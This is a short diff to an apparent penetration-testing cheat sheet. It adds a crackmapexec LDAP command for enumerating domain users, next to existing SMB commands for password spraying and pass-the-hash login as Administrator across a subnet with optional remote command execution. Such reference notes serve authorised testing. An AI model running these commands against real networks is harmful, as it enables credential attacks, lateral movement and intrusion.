@@ -60,3 +60,8 @@ $ crackmapexec smb <IP> -u </path/to/username> -p </path/to/passwords>
 ```shell-session
 # crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 [-x <COMMAND>]
 ```
+# LDAP
+## Extract Users
+```shell-session
+$ crackmapexec ldap <IP> -u <USER> -p <PASS> --users
+```
